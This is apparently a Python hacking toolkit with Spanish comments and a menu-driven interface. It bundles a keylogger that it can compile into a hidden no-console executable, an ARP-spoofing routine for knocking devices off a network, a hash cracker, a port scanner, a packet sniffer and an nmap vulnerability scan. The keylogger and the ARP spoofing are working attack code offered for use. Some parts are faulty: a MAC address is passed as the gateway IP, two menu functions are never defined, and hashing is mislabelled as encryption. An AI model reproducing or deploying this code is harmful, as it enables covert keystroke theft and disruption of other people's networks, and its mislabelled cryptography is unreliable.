import socket
import os
from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, get_if_list, sniff
from pynput.keyboard import Listener
from concurrent.futures import ThreadPoolExecutor
import hashlib
import itertools
import string
import requests
import time
import psutil
import threading
import subprocess
import random
import string
import whois
import cryptography
from cryptography.fernet import Fernet
import re
from datetime import datetime
##############################################################################################################################################################
def logo():
    logo_text = r"""
  ____  _            _       
 / ___|| |__   __ _| | _____ 
 \___ \| '_ \ / _` | |/ / _ \
  ___) | | | | (_| |   <  __/
 |____/|_| |_|\__,_|_|\_\___|
                             
    """
    print(logo_text)

if __name__ == "__main__":
    logo()
##############################################################################################################################################################
def load_oui_data(file_path):
    oui_dict = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()  # Limpiar la línea

                # Ignorar líneas vacías
                if not line:
                    continue

                # Si la línea contiene (hex), dividimos por eso
                if ' (hex)' in line:
                    oui_part, manufacturer_part = line.split(' (hex)', 1)
                    oui_part = oui_part.strip()  # Limpiar OUI
                    manufacturer_part = manufacturer_part.strip()  # Limpiar fabricante

                    # Obtener el OUI y el fabricante
                    parts = oui_part.split()  # Separar por espacios
                    if len(parts) >= 1:
                        oui_prefix = parts[0].strip()  # Obtener el OUI
                        manufacturer = manufacturer_part.strip()  # Usar el fabricante después de "(hex)"

                        # Convertir el OUI a mayúsculas y asegurarse de que tenga guiones
                        oui_prefix = oui_prefix.upper().replace(':', '-')  # Mantener el formato
                        oui_prefix = oui_prefix.rstrip('-')  # Asegurarse de no tener un guion al final

                        # Añadir al diccionario
                        oui_dict[oui_prefix] = manufacturer
    except Exception as e:
        print(f"Error al cargar el archivo OUI: {e}")
    return oui_dict

# Cargar el diccionario OUI
oui_dict = load_oui_data('OUI/ieee-oui.txt')

def get_device_info(mac, oui_dict):
    """Obtener información de marca y modelo a partir de la dirección MAC."""
    # Convertir la dirección MAC al formato de búsqueda
    oui_prefix = mac.replace(':', '-').upper()[:8]  # Toma los primeros 8 caracteres en formato X-X-X-X
    #print(f"Buscando OUI: {oui_prefix}")  # Debug

    # Comprobar si el OUI está en el diccionario
    if oui_prefix in oui_dict:
        #print(f"Encontrado en diccionario: {oui_prefix}: {oui_dict[oui_prefix]}")
        return oui_dict[oui_prefix]
    else:
        #print(f"No encontrado en diccionario: {oui_prefix}")
        return "Desconocido"

def disconnect_device(target_ip, target_mac, interface):
    """Desconectar un dispositivo de la red usando ARP Spoofing."""
    try:
        # Obtener la dirección IP de la puerta de enlace de la interfaz
        gateway_ip = get_if_hwaddr(interface)  # Obtener la MAC de la interfaz activa
        arp_response = ARP(op=2, psrc=gateway_ip, hwsrc="00:00:00:00:00:00", pdst=target_ip, hwdst=target_mac)
        send(arp_response, verbose=0)  # Enviar el paquete sin mostrar salida
        print(f"Dispositivo {target_ip} desconectado.")
    except Exception as e:
        print(f"Error al intentar desconectar el dispositivo: {e}")

def is_valid_ip(ip):
    """Validar el formato de una dirección IP."""
    import re
    return re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip)

def network_scanner(target_ip):
    """Escanear la red para encontrar dispositivos conectados."""
    try:
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})

        print("\nDispositivos en la red:")
        for device in devices:
            # Obtener información de la marca y modelo usando la función get_device_info
            device_info = get_device_info(device['mac'], oui_dict)
            print(f"IP: {device['ip']} - MAC: {device['mac']} - Marca: {device_info}")

        # Preguntar si desea desconectar algún dispositivo
        disconnect_choice = input("\n¿Te gustaría desconectar algún dispositivo? (s/n): ").strip().lower()
        if disconnect_choice == "s":
            target_ip = input("Ingrese la IP del dispositivo a desconectar: ").strip()
            if not is_valid_ip(target_ip):
                print("La dirección IP ingresada no es válida.")
                return
            
            target_mac = next((device['mac'] for device in devices if device['ip'] == target_ip), None)
            if target_mac:
                # Elegir la primera interfaz de red activa
                interface = get_if_list()[0]  # Puedes cambiar esto a una interfaz específica si es necesario
                disconnect_device(target_ip, target_mac, interface)  # Llama a la función de desconexión
            else:
                print("Dispositivo no encontrado.")
        else:
            print("Regresando al menú principal.")
    except Exception as e:
        print(f"Error en el escáner de red: {e}")

##############################################################################################################################################################
##############################################################################################################################################################
# Escaneo de puertos
def port_scanner(target_ip, port=None, port_range=None):
    """Escanea puertos en la dirección IP objetivo.
    
    Args:
        target_ip (str): La dirección IP del objetivo.
        port (int, optional): Un puerto específico a escanear.
        port_range (tuple, optional): Un rango de puertos a escanear.
    """
    open_ports = []

    def scan(port):
        """Función auxiliar para escanear un puerto."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)  # Establecer un tiempo de espera
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)

    # Escanear todos los puertos si no se especifica un puerto o rango
    if port is None and port_range is None:
        print(f"Escaneando todos los puertos en {target_ip}...")
        for port in range(1, 65536):
            thread = threading.Thread(target=scan, args=(port,))
            thread.start()
            # Limitar el número de hilos para evitar problemas de recursos
            if port % 100 == 0:
                thread.join()  # Esperar a que los hilos terminen

    # Escanear un rango de puertos
    elif port_range:
        start_port, end_port = port_range
        print(f"Escaneando puertos del {start_port} al {end_port} en {target_ip}...")
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan, args=(port,))
            thread.start()
            if port % 100 == 0:
                thread.join()

    # Escanear un puerto específico
    elif port:
        print(f"Escaneando el puerto {port} en {target_ip}...")
        scan(port)

    # Esperar a que terminen todos los hilos
    for thread in threading.enumerate():
        if thread is not threading.main_thread():
            thread.join()

    # Mostrar los puertos abiertos encontrados
    if open_ports:
        print(f"Puertos abiertos en {target_ip}: {', '.join(map(str, open_ports))}")
    else:
        print(f"No se encontraron puertos abiertos en {target_ip}.")
##############################################################################################################################################################
##############################################################################################################################################################
def setup_keylogger_directory():
    """Crea la carpeta 'keylogger' si no existe."""
    if not os.path.exists("keylogger"):
        os.makedirs("keylogger")
    print("Carpeta 'keylogger' configurada.")

def log_keystrokes(key):
    """Función para registrar las teclas en un archivo de texto."""
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[Borrar]'
    
    file_path = os.path.join("keylogger", "registro_teclas.txt")
    with open(file_path, "a") as file:
        file.write(key)

def start_keylogger():
    """Inicia el keylogger para registrar teclas en 'registro_teclas.txt'."""
    setup_keylogger_directory()
    print("Iniciando keylogger... (presiona CTRL+C para detener)")

    # Definimos una función para iniciar el listener
    def run_listener():
        with Listener(on_press=log_keystrokes) as listener:
            listener.join()

    # Creamos y comenzamos el hilo
    listener_thread = threading.Thread(target=run_listener)
    listener_thread.start()

    try:
        while True:
            # Mantiene el hilo principal en ejecución
            pass
    except KeyboardInterrupt:
        print("\nKeylogger detenido por el usuario.")
        # Detenemos el listener
        listener_thread.join(timeout=1)  # Espera un poco para permitir la finalización
        
def generate_keylogger_exe():
    """Genera el archivo ejecutable del keylogger dentro de la carpeta 'keylogger'."""
    setup_keylogger_directory()
    keylogger_script = os.path.join("keylogger", "keylogger.py")
    
    keylogger_code = """
from pynput.keyboard import Listener
import os

def log_keystrokes(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\\n'
    elif key == 'Key.backspace':
        key = '[Borrar]'
    
    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "registro_teclas.txt")
    with open(file_path, "a") as file:
        file.write(key)

def start_keylogger():
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
    """

    with open(keylogger_script, "w") as f:
        f.write(keylogger_code)
    
    # Ejecuta PyInstaller para crear el ejecutable en la carpeta 'keylogger'
    try:
        print("Generando el ejecutable del keylogger...")
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", keylogger_script, "--distpath", "keylogger"], check=True)
        print("El ejecutable se ha creado exitosamente en la carpeta 'keylogger'.")
    except Exception as e:
        print(f"Error al generar el ejecutable: {e}")
    
    cleanup()

def cleanup():
    """Limpia archivos generados por PyInstaller para no dejar residuos."""
    for folder in ["build", "__pycache__"]:
        if os.path.exists(folder):
            subprocess.run(["rm", "-rf", folder])  # Para Windows, usa "rmdir /s /q" en lugar de "rm -rf"
    spec_file = "keylogger/keylogger.spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)
##############################################################################################################################################################
##############################################################################################################################################################
import hashlib
import string
import itertools
import os
from datetime import datetime

def load_dictionary(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except Exception as e:
        print(f"Error al cargar el diccionario: {e}")
        return []

def hash_password(password, algorithm="md5"):
    try:
        if algorithm == "md5":
            return hashlib.md5(password.encode()).hexdigest()
        elif algorithm == "sha1":
            return hashlib.sha1(password.encode()).hexdigest()
        elif algorithm == "sha256":
            return hashlib.sha256(password.encode()).hexdigest()
        else:
            raise ValueError("Algoritmo de hash no soportado.")
    except Exception as e:
        print(f"Error al hashear la contraseña: {e}")
        return None

def save_passwords_to_file(passwords):
    folder_name = "cracker"
    os.makedirs(folder_name, exist_ok=True)

    base_name = datetime.now().strftime("%Y-%m-%d")
    file_name = os.path.join(folder_name, f"{base_name}.txt")

    counter = 1
    while os.path.exists(file_name):
        file_name = os.path.join(folder_name, f"{base_name}_{counter}.txt")
        counter += 1

    try:
        with open(file_name, "w") as file:
            for password in passwords:
                file.write(password + "\n")
        print(f"Contraseñas guardadas en: {file_name}")
    except Exception as e:
        print(f"Error al guardar las contraseñas: {e}")

def dictionary_attack(target_hash, algorithm="md5"):
    dictionary_path = input("Introduce el nombre del archivo de diccionario (incluyendo extensión): ")
    passwords = load_dictionary(dictionary_path)
    print(f"Iniciando ataque de diccionario usando {algorithm}...")

    for password in passwords:
        hashed_password = hash_password(password, algorithm)
        if hashed_password == target_hash:
            print(f"\u00a1Contraseña encontrada!: '{password}'")
            return password

    print("No se encontró la contraseña en el diccionario.")
    return None

def brute_force_attack(max_length, algorithm="md5"):
    print(f"Iniciando generacion de contraseñas {max_length} caracteres usando {algorithm}...")
    characters = string.ascii_letters + string.digits  # Incluye letras y dígitos
    passwords = []

    for length in range(1, max_length + 1):
        for combination in itertools.product(characters, repeat=length):
            password = ''.join(combination)
            print(f"Generando: {password}")  # Imprimir las combinaciones probadas (opcional)
            passwords.append(password)

    save_passwords_to_file(passwords)

def password_cracker():
    conoce_hash = input("\u00bfConoce el hash de la contraseña? (s/n): ").lower()

    if conoce_hash == 's':
        target_hash = input("Introduce el hash objetivo: ")
        algorithm = input("Introduce el algoritmo de hash (md5, sha1, sha256): ")
        dictionary_attack(target_hash, algorithm)
    elif conoce_hash == 'n':
        longitud_conocida = input("\u00bfConoce la longitud máxima de la contraseña? (s/n): ").lower()

        if longitud_conocida == 's':
            max_length = int(input("Longitud máxima de la contraseña a generar: "))
            brute_force_attack(max_length)
        else:
            print("Debe conseguir más información sobre la longitud de la contraseña.")
    else:
        print("Opción no válida. Intente de nuevo.")
##############################################################################################################################################################
def vulnerability_scanner():
    """Escanea vulnerabilidades en el objetivo utilizando nmap."""
    target_ip = input("Ingrese la dirección IP o rango para escanear: ")
    
    print(f"Escaneando vulnerabilidades en {target_ip}...")
    
    # Ejecutar el comando nmap para escanear vulnerabilidades
    os.system(f"nmap -sV --script=vuln {target_ip}")
    
    print("Escaneo de vulnerabilidades completado.")

##############################################################################################################################################################
def packet_handler(packet, output_file):
    """Maneja el paquete capturado e imprime información relevante."""
    with open(output_file, "a") as f:
        f.write(str(packet) + "\n")  # Escribe el paquete en el archivo
    print(packet.summary())  # Imprime un resumen del paquete

def network_sniffer():
    """Captura paquetes de la red y los maneja mediante packet_handler."""
    
    # Crea la carpeta 'captura' si no existe
    directory = "captura"
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    # Crea un nombre de archivo basado en la fecha y hora actuales
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_file = os.path.join(directory, f"paquetes_{current_time}.txt")

    duration = input("¿Cuántos segundos desea capturar paquetes? ")
    
    try:
        duration = int(duration)
        if duration <= 0:
            print("La duración debe ser un número positivo.")
            return
    except ValueError:
        print("Entrada no válida. Debe ingresar un número entero.")
        return

    print(f"Iniciando el sniffer de red por {duration} segundos. Presione Ctrl+C para detener anticipadamente.")
    sniff(prn=lambda pkt: packet_handler(pkt, output_file), timeout=duration, store=0)  # Captura por un tiempo limitado
    print(f"Captura finalizada. Los paquetes se han guardado en {output_file}.")
##############################################################################################################################################################
def password_generator():
    """Genera una contraseña aleatoria basada en la longitud especificada por el usuario."""
    try:
        length = int(input("Ingrese la longitud deseada para la contraseña (mínimo 6 caracteres): "))
        if length < 6:
            print("La longitud de la contraseña debe ser al menos 6 caracteres.")
            return
        
        # Definir los caracteres que se utilizarán en la contraseña
        characters = string.ascii_letters + string.digits + string.punctuation
        
        # Generar una contraseña aleatoria
        password = ''.join(random.choice(characters) for _ in range(length))
        
        print(f"\nContraseña generada: {password}")
    except ValueError:
        print("Por favor, ingrese un número válido para la longitud de la contraseña.")
##############################################################################################################################################################
def whois_lookup():
    """Busca información de WHOIS para un dominio específico."""
    domain = input("Ingrese el nombre del dominio (por ejemplo, example.com): ")
    try:
        w = whois.whois(domain)
        print("\n--- Información de WHOIS ---")
        print(f"Dominio: {w.domain_name}")
        print(f"Registrar: {w.registrar}")
        print(f"Fecha de creación: {w.creation_date}")
        print(f"Fecha de expiración: {w.expiration_date}")
        print(f"Servidores DNS: {w.name_servers}")
        print(f"Información de contacto: {w.email}")
    except Exception as e:
        print(f"Error al obtener información de WHOIS: {e}")

##############################################################################################################################################################
def encrypt_file(file_path, key=None, algorithm=None):
    """Cifra un archivo usando el algoritmo seleccionado."""
    with open(file_path, 'rb') as file:
        data = file.read()

    if algorithm is None:  # Usar cifrado simétrico con Fernet si no se selecciona un algoritmo
        f = Fernet(key)
        encrypted_data = f.encrypt(data)
        # Guardar con la extensión .fernet
        with open(file_path + '.fernet', 'wb') as file:
            file.write(encrypted_data)
        print(f"Archivo cifrado: {file_path}.fernet")
    else:
        # Cifrado con hash (MD5, SHA1, SHA256)
        if algorithm == "md5":
            hash_object = hashlib.md5(data)
        elif algorithm == "sha1":
            hash_object = hashlib.sha1(data)
        elif algorithm == "sha256":
            hash_object = hashlib.sha256(data)
        else:
            print("Algoritmo no reconocido, se usará el cifrado simétrico.")
            f = Fernet(key)
            encrypted_data = f.encrypt(data)
            with open(file_path + '.fernet', 'wb') as file:
                file.write(encrypted_data)
            print(f"Archivo cifrado con Fernet: {file_path}.fernet")
            return

        hash_hex = hash_object.hexdigest()
        # Usar la extensión del algoritmo seleccionado
        with open(file_path + f'.{algorithm}', 'w') as file:
            file.write(hash_hex)
        print(f"Archivo cifrado con {algorithm}: {file_path}.{algorithm}")

def decrypt_file(file_path, key=None, algorithm=None):
    """Descifra un archivo usando el algoritmo seleccionado."""
    if algorithm is None:  # Usar cifrado simétrico con Fernet si no se selecciona un algoritmo
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        f = Fernet(key)
        decrypted_data = f.decrypt(encrypted_data)
        with open(file_path[:-7], 'wb') as file:  # Eliminar '.fernet'
            file.write(decrypted_data)
        print(f"Archivo descifrado: {file_path[:-7]}")
    else:
        print("El descifrado con hash no es posible, ya que los algoritmos como MD5, SHA1, y SHA256 son unidireccionales.")
        print("No se puede revertir el proceso de cifrado de estos algoritmos.")

def generate_key():
    """Genera una clave para cifrado simétrico con Fernet."""
    key = Fernet.generate_key()
    print(f"Clave generada para cifrado simétrico: {key.decode()}")
    return key

def choose_encryption_algorithm():
    """Permite al usuario elegir el algoritmo de cifrado."""
    print("\nSeleccione un algoritmo de cifrado:")
    print("1. MD5")
    print("2. SHA-1")
    print("3. SHA-256")
    print("4. Cifrado simétrico (Fernet)")
    choice = input("Ingrese el número de la opción deseada: ")
    
    if choice == "1":
        return "md5"
    elif choice == "2":
        return "sha1"
    elif choice == "3":
        return "sha256"
    elif choice == "4":
        return None  # None indica que se usará Fernet
    else:
        print("Opción no válida. Se usará el cifrado simétrico por defecto.")
        return None
##############################################################################################################################################################
def hash_generator():
    """Genera un hash para un texto ingresado por el usuario."""
    print("\n--- Generador de Hash ---")
    text = input("Ingrese el texto para generar el hash: ")
    
    print("Seleccione el tipo de hash:")
    print("1. MD5")
    print("2. SHA-1")
    print("3. SHA-256")
    option = input("Seleccione una opción o escriba exit para volver atras: ")

    if option == "1":
        hash_result = hashlib.md5(text.encode()).hexdigest()
        print(f"Hash MD5: {hash_result}")
    elif option == "2":
        hash_result = hashlib.sha1(text.encode()).hexdigest()
        print(f"Hash SHA-1: {hash_result}")
    elif option == "3":
        hash_result = hashlib.sha256(text.encode()).hexdigest()
        print(f"Hash SHA-256: {hash_result}")
    else:
        print("Opción no válida.")
##############################################################################################################################################################
def wifi_scanner():
    """Escanea las redes Wi-Fi disponibles y muestra información básica."""
    print("Escaneando redes Wi-Fi...")
    # Ejecutar el comando para escanear redes Wi-Fi
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "network"], universal_newlines=True)
        print(result)
    except Exception as e:
        print(f"Error al escanear redes Wi-Fi: {e}")
##############################################################################################################################################################
def clear_screen():
    """Limpia la pantalla dependiendo del sistema operativo."""
    try:
        # Comprobar el sistema operativo y usar el comando adecuado
        if os.name == 'nt':  # Windows
            os.system('cls')
        else:  # Unix/Linux/Mac
            os.system('clear')
    except Exception as e:
        print(f"Error al limpiar la pantalla: {e}")

def menu():
    """Muestra el menú y retorna la opción elegida por el usuario."""
    print("\n--- Menú de Opciones ---")
    print("1. Redes")
    print("2. Seguridad")
    print("3. Contraseñas")
    print("4. Otros")
    print("0. Volver atrás")
    return input("Seleccione una opción: ")

def networks_menu():
    """Muestra las opciones relacionadas con redes."""
    print("\n--- Opciones de Redes ---")
    print("1. Escanear red")
    print("2. Escanear puertos")
    print("3. Escanear redes Wi-Fi")
    print("0. Volver atrás")
    return input("Seleccione una opción: ")

def security_menu():
    """Muestra las opciones de seguridad."""
    print("\n--- Opciones de Seguridad ---")
    print("1. Keylogger")
    print("2. Crackear contraseñas")
    print("3. Escaneo de Vulnerabilidades (solo con nmap instalado)")
    print("4. Herramienta de sniffer de red")
    print("5. Búsqueda de Información de WHOIS")
    print("0. Volver atrás")
    return input("Seleccione una opción: ")

def password_menu():
    """Muestra las opciones relacionadas con contraseñas."""
    print("\n--- Opciones de Contraseñas ---")
    print("1. Generador de Contraseñas")
    print("2. Cifrador/Descifrador de Archivos")
    print("3. Generador de Hash")
    print("0. Volver atrás")
    return input("Seleccione una opción: ")

def other_tools_menu():
    """Muestra las opciones de otras herramientas."""
    print("\n--- Otras Herramientas ---")
    print("1. [Más herramientas por agregar en el futuro]")
    print("0. Volver atrás")
    return input("Seleccione una opción: ")
# Función principal
def main():
    while True:
        try:
            clear_screen()  # Llamamos a la función para limpiar la pantalla al inicio de cada ciclo
            logo()
            opcion = menu()
            if opcion == "1":
                # Submenú de redes
                while True:
                    network_option = networks_menu()
                    if network_option == "1":
                        target_ip = input("Ingrese el rango de IP objetivo (por ejemplo, 192.168.1.0/24): ")
                        network_scanner(target_ip)
                        input("Presione Enter para continuar...")
                    elif network_option == "2":
                        target_ip = input("Ingrese la dirección IP para el escaneo de puertos: ")
                        port_option = port_scanner_menu()

                        if port_option == "1":
                            port_scanner(target_ip)
                        elif port_option == "2":
                            port_range_input = input("Ingrese el rango de puertos a escanear (por ejemplo, 1-1024): ")
                            try:
                                port_range = list(map(int, port_range_input.split('-')))
                                if len(port_range) == 2 and port_range[0] < port_range[1]:
                                    port_scanner(target_ip, port_range=(port_range[0], port_range[1]))
                                else:
                                    print("Rango de puertos no válido. Intente de nuevo.")
                            except ValueError:
                                print("Entrada no válida. Asegúrese de ingresar un rango en el formato correcto.")
                        elif port_option == "3":
                            port_input = input("Ingrese el puerto a escanear: ")
                            try:
                                port = int(port_input)
                                if 1 <= port <= 65535:
                                    port_scanner(target_ip, port=port)
                                else:
                                    print("El puerto debe estar entre 1 y 65535.")
                            except ValueError:
                                print("Entrada no válida. Asegúrese de ingresar un número de puerto válido.")
                        else:
                            print("Opción no válida. Intente de nuevo.")
                    elif network_option == "3":
                        wifi_scanner()  # Llamar a la función para escanear redes Wi-Fi
                        input("Presione Enter para continuar...")
                    elif network_option == "0":
                        break  # Volver al menú principal
                    else:
                        print("Opción no válida. Intente de nuevo.")
            
            elif opcion == "2":
                # Submenú de seguridad
                while True:
                    security_option = security_menu()
                    if security_option == "1":
                        keylogger_option = keylogger_menu()
                        if keylogger_option == "1":
                            generate_keylogger_exe()
                        elif keylogger_option == "2":
                            start_keylogger()
                        else:
                            print("Opción no válida. Intente de nuevo.")
                    elif security_option == "2":
                        password_cracker()
                    elif security_option == "3":
                        vulnerability_scanner()  # Llamar a la función para el escaneo de vulnerabilidades
                    elif security_option == "4":
                        network_sniffer()  # Llamar a la herramienta de sniffer de red
                    elif security_option == "5":
                        whois_lookup()  # Llamar a la función WHOIS
                    elif security_option == "0":
                        break  # Volver al menú principal
                    else:
                        print("Opción no válida. Intente de nuevo.")
            
            elif opcion == "3":
                # Submenú de contraseñas
                while True:
                    password_option = password_menu()
                    if password_option == "1":
                        password_generator()  # Llamar a la función generadora de contraseñas
                    elif password_option == "2":
                        # Solicitar primero qué algoritmo de cifrado usar
                        algorithm = choose_encryption_algorithm()  # Función que permite al usuario elegir el algoritmo
                        key = generate_key()  # Generar la clave para cifrado simétrico
                        action = input("¿Desea cifrar o descifrar un archivo? (cifrar/descifrar): ").strip().lower()
                        if action == "cifrar":
                            file_name = input("Ingrese el nombre del archivo a cifrar: ")
                            encrypt_file(file_name, key, algorithm)  # Llamar a la función de encriptado
                        elif action == "descifrar":
                            file_name = input("Ingrese el nombre del archivo a descifrar: ")
                            decrypt_file(file_name, key, algorithm)  # Llamar a la función de desencriptado
                        else:
                            print("Acción no válida. Debe elegir 'cifrar' o 'descifrar'.")
                    elif password_option == "3":
                        hash_generator()  # Llamar a la función generadora de hash
                    elif password_option == "0":
                        break  # Volver al menú principal
                    else:
                        print("Opción no válida. Intente de nuevo.")
            
            elif opcion == "4":
                # Submenú de otras herramientas
                while True:
                    other_tools_option = other_tools_menu()
                    if other_tools_option == "1":
                        print("Este será un espacio para más herramientas en el futuro.")
                    elif other_tools_option == "0":
                        break  # Volver al menú principal
                    else:
                        print("Opción no válida. Intente de nuevo.")
            
            elif opcion == "0":
                print("Saliendo del programa.")
                break
            else:
                print("Opción no válida. Intente de nuevo.")
        except Exception as e:
            print(f"Error en la ejecución principal: {e}")

if __name__ == "__main__":
    main()

##############################################################################################################################################################